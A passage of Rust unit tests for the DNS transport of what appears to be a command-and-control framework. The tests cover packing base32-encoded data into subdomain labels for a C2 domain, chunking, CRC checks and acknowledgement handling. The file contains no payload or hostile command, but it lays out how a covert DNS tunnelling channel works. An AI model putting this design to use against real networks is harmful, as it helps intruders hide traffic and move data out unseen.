        // Should be lowercase
        assert_eq!(encoded, encoded.to_lowercase());
    }

    #[test]
    fn test_encode_data_valid_chars() {
        let data = b"test data with various bytes \x00\xFF";
        let encoded = DNS::encode_data(data);

        // Base32 only uses a-z, 2-7
        for c in encoded.chars() {
            assert!(
                c.is_ascii_lowercase() || ('2'..='7').contains(&c),
                "Invalid char in base32: {}",
                c
            );
        }
    }

    // ============================================================
    // URL Parsing / Transport::new Tests
    // ============================================================

    #[test]
    fn test_new_single_server() {
        let dns = DNS::new(
            "dns://8.8.8.8:53?domain=dnsc2.realm.pub".to_string(),
            Config::default(),
        )
        .expect("should parse");

        assert_eq!(dns.base_domain, "dnsc2.realm.pub");
        assert!(dns.dns_servers.contains(&"8.8.8.8:53".to_string()));
        assert_eq!(dns.record_type, DnsRecordType::TXT);
    }

    #[test]
    fn test_new_multiple_servers() {
        // Multiple servers are specified in the host portion, comma-separated
        let dns = DNS::new(
            "dns://8.8.8.8,1.1.1.1:53?domain=dnsc2.realm.pub".to_string(),
            Config::default(),
        )
        .expect("should parse");

        assert_eq!(dns.dns_servers.len(), 2);
        assert!(dns.dns_servers.contains(&"8.8.8.8:53".to_string()));
        assert!(dns.dns_servers.contains(&"1.1.1.1:53".to_string()));
    }

    #[test]
    fn test_new_record_type_a() {
        let dns = DNS::new(
            "dns://8.8.8.8?domain=dnsc2.realm.pub&type=a".to_string(),
            Config::default(),
        )
        .expect("should parse");
        assert_eq!(dns.record_type, DnsRecordType::A);
    }

    #[test]
    fn test_new_record_type_aaaa() {
        let dns = DNS::new(
            "dns://8.8.8.8?domain=dnsc2.realm.pub&type=aaaa".to_string(),
            Config::default(),
        )
        .expect("should parse");
        assert_eq!(dns.record_type, DnsRecordType::AAAA);
    }

    #[test]
    fn test_new_record_type_txt_default() {
        let dns = DNS::new(
            "dns://8.8.8.8?domain=dnsc2.realm.pub".to_string(),
            Config::default(),
        )
        .expect("should parse");
        assert_eq!(dns.record_type, DnsRecordType::TXT);
    }

    #[test]
    fn test_new_wildcard_uses_fallbacks() {
        let dns = DNS::new(
            "dns://*?domain=dnsc2.realm.pub".to_string(),
            Config::default(),
        )
        .expect("should parse");

        // Should have fallback servers
        assert!(!dns.dns_servers.is_empty());
        // Fallback servers include known DNS resolvers
        let has_fallback = dns
            .dns_servers
            .iter()
            .any(|s| s.contains("1.1.1.1") || s.contains("8.8.8.8"));
        assert!(has_fallback, "Should have fallback DNS servers");
    }

    #[test]
    fn test_new_missing_domain() {
        let result = DNS::new("dns://8.8.8.8:53".to_string(), Config::default());
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("domain parameter is required"));
    }

    #[test]
    fn test_new_without_scheme() {
        let dns = DNS::new(
            "8.8.8.8:53?domain=dnsc2.realm.pub".to_string(),
            Config::default(),
        )
        .expect("should parse");
        assert_eq!(dns.base_domain, "dnsc2.realm.pub");
    }

    // ============================================================
    // DNS Packet Building Tests
    // ============================================================

    #[test]
    fn test_build_subdomain_simple() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec!["8.8.8.8:53".to_string()],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let packet = DnsPacket {
            r#type: PacketType::Init as i32,
            sequence: 0,
            conversation_id: "test1234".to_string(),
            data: vec![0x01, 0x02],
            crc32: 0,
            window_size: SEND_WINDOW_SIZE as u32,
            acks: vec![],
            nacks: vec![],
        };

        let subdomain = dns.build_subdomain(&packet).expect("should build");

        // Should end with base domain
        assert!(subdomain.ends_with(".dnsc2.realm.pub"));

        // Should not exceed DNS limits
        assert!(subdomain.len() <= MAX_DNS_NAME_LENGTH);

        // Each label should be <= 63 chars
        for label in subdomain.split('.') {
            assert!(
                label.len() <= MAX_LABEL_LENGTH,
                "Label too long: {}",
                label.len()
            );
        }
    }

    #[test]
    fn test_build_subdomain_label_splitting() {
        let dns = DNS {
            base_domain: "x.com".to_string(),
            dns_servers: vec!["8.8.8.8:53".to_string()],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        // Create a packet with enough data to require label splitting
        let packet = DnsPacket {
            r#type: PacketType::Data as i32,
            sequence: 1,
            conversation_id: "test1234".to_string(),
            data: vec![0xAA; 50], // 50 bytes of data
            crc32: DNS::calculate_crc32(&vec![0xAA; 50]),
            window_size: 10,
            acks: vec![],
            nacks: vec![],
        };

        let subdomain = dns.build_subdomain(&packet).expect("should build");

        // Should have multiple labels (dots)
        let label_count = subdomain.matches('.').count();
        assert!(
            label_count > 1,
            "Expected multiple labels, got {}",
            label_count
        );
    }

    // ============================================================
    // DNS Query Building Tests
    // ============================================================

    #[test]
    fn test_build_dns_query_txt() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let (query, txid) = dns
            .build_dns_query("test.dnsc2.realm.pub")
            .expect("should build");

        // Header should be 12 bytes minimum
        assert!(query.len() > 12);

        // Transaction ID should be in first 2 bytes
        let query_txid = u16::from_be_bytes([query[0], query[1]]);
        assert_eq!(query_txid, txid);

        // Flags should be standard query (0x0100)
        assert_eq!(query[2], 0x01);
        assert_eq!(query[3], 0x00);

        // Questions count should be 1
        assert_eq!(query[4], 0x00);
        assert_eq!(query[5], 0x01);
    }

    // ============================================================
    // DNS Response Parsing Tests
    // ============================================================

    #[test]
    fn test_parse_dns_response_too_short() {
        let dns = DNS {
            base_domain: "".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let short_response = vec![0u8; 10]; // Less than 12 bytes
        let result = dns.parse_dns_response(&short_response, 0x1234);
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_dns_response_txid_mismatch() {
        let dns = DNS {
            base_domain: "".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        // Response with different transaction ID
        let mut response = vec![0u8; 20];
        response[0] = 0x12;
        response[1] = 0x34; // txid = 0x1234

        let result = dns.parse_dns_response(&response, 0x5678); // Expect 0x5678
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("mismatch"));
    }

    // ============================================================
    // Chunk Size Calculation Tests
    // ============================================================

    #[test]
    fn test_calculate_max_chunk_size_larger_domain_smaller_chunk() {
        let dns_short = DNS {
            base_domain: "x.co".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let dns_long = DNS {
            base_domain: "very.long.subdomain.dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let chunk_short = dns_short.calculate_max_chunk_size(10);
        let chunk_long = dns_long.calculate_max_chunk_size(10);

        // Longer domain leaves less room for data (or same if both exceed available space)
        assert!(chunk_short >= chunk_long);
    }

    // ============================================================
    // Validate and Prepare Chunks Tests
    // ============================================================

    #[test]
    fn test_validate_and_prepare_chunks_empty() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let (chunk_size, total_chunks, crc) = dns.validate_and_prepare_chunks(&[]).unwrap();

        assert!(chunk_size > 0);
        assert_eq!(total_chunks, 1); // Even empty data needs 1 chunk
                                     // CRC is deterministic - just verify it's calculated
        assert_eq!(crc, DNS::calculate_crc32(&[]));
    }

    #[test]
    fn test_validate_and_prepare_chunks_small_data() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let data = vec![0xAA; 50];
        let (chunk_size, total_chunks, crc) = dns.validate_and_prepare_chunks(&data).unwrap();

        assert!(chunk_size > 0);
        assert!(total_chunks >= 1);
        assert_eq!(crc, DNS::calculate_crc32(&data));
    }

    #[test]
    fn test_validate_and_prepare_chunks_exceeds_max() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        let huge_data = vec![0xFF; MAX_DATA_SIZE + 1];
        let result = dns.validate_and_prepare_chunks(&huge_data);

        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("exceeds maximum"));
    }

    // ============================================================
    // Transport Trait Tests
    // ============================================================

    #[test]
    fn test_init_creates_empty_transport() {
        let dns = DNS::init();
        assert!(dns.base_domain.is_empty());
        assert!(dns.dns_servers.is_empty());
        assert!(!dns.is_active());
    }

    #[test]
    fn test_is_active_with_config() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec!["8.8.8.8:53".to_string()],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        assert!(dns.is_active());
    }

    #[test]
    fn test_is_active_empty_domain() {
        let dns = DNS {
            base_domain: "".to_string(),
            dns_servers: vec!["8.8.8.8:53".to_string()],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        assert!(!dns.is_active());
    }

    #[test]
    fn test_is_active_no_servers() {
        let dns = DNS {
            base_domain: "dnsc2.realm.pub".to_string(),
            dns_servers: vec![],
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        };

        assert!(!dns.is_active());
    }

    #[test]
    fn test_name_returns_dns() {
        let dns = DNS::init();
        assert_eq!(dns.name(), "dns");
    }

    #[test]
    fn test_list_available() {
        let dns = DNS::init();
        let available = dns.list_available();
        assert_eq!(available, vec!["dns".to_string()]);
    }

    #[test]
    fn test_get_type() {
        let mut dns = DNS::init();
        assert_eq!(dns.get_type(), pb::c2::transport::Type::TransportDns);
    }

    // ============================================================
    // DnsRecordType Tests
    // ============================================================

    #[test]
    fn test_dns_record_type_equality() {
        assert_eq!(DnsRecordType::TXT, DnsRecordType::TXT);
        assert_eq!(DnsRecordType::A, DnsRecordType::A);
        assert_eq!(DnsRecordType::AAAA, DnsRecordType::AAAA);
        assert_ne!(DnsRecordType::TXT, DnsRecordType::A);
    }

    // ============================================================
    // Chunk Response Processing Tests
    // ============================================================

    #[test]
    fn test_process_chunk_response_invalid_protobuf() {
        let invalid_data = vec![0xFF, 0xFF, 0xFF];
        let result = DNS::process_chunk_response(&invalid_data, 1, 10);

        // Should not error, just mark for retry
        assert!(result.is_ok());
        let (_acks, nacks) = result.unwrap();
        assert!(nacks.contains(&1));
    }

    #[test]
    fn test_process_chunk_response_valid_status() {
        // Create a valid STATUS packet with ACKs
        let status_packet = DnsPacket {
            r#type: PacketType::Status as i32,
            sequence: 0,
            conversation_id: "test".to_string(),
            data: vec![],
            crc32: 0,
            window_size: 10,
            acks: vec![AckRange {
                start_seq: 1,
                end_seq: 3,
            }],
            nacks: vec![5, 6],
        };

        let mut buf = Vec::new();
        status_packet.encode(&mut buf).unwrap();

        let result = DNS::process_chunk_response(&buf, 1, 10);
        assert!(result.is_ok());

        let (acks, nacks) = result.unwrap();
        assert!(acks.contains(&1));
        assert!(acks.contains(&2));
        assert!(acks.contains(&3));
        assert!(nacks.contains(&5));
        assert!(nacks.contains(&6));
    }
}
